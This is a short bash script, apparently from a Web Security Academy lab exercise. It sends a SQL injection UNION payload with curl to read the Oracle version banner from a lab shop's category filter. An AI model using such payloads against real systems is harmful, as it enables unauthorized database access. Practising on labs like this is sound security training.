#!/bin/bash
url="https://0ab400850365040981ef61ee007a0094.web-security-academy.net/filter?category=Gifts"
# Test for SQL injection with Oracle version detection - proper URL encoding
payload="'%20UNION%20SELECT%20banner,%20NULL%20FROM%20v\$version--"
curl -s -G "$url" --data-urlencode "category=Gifts$payload"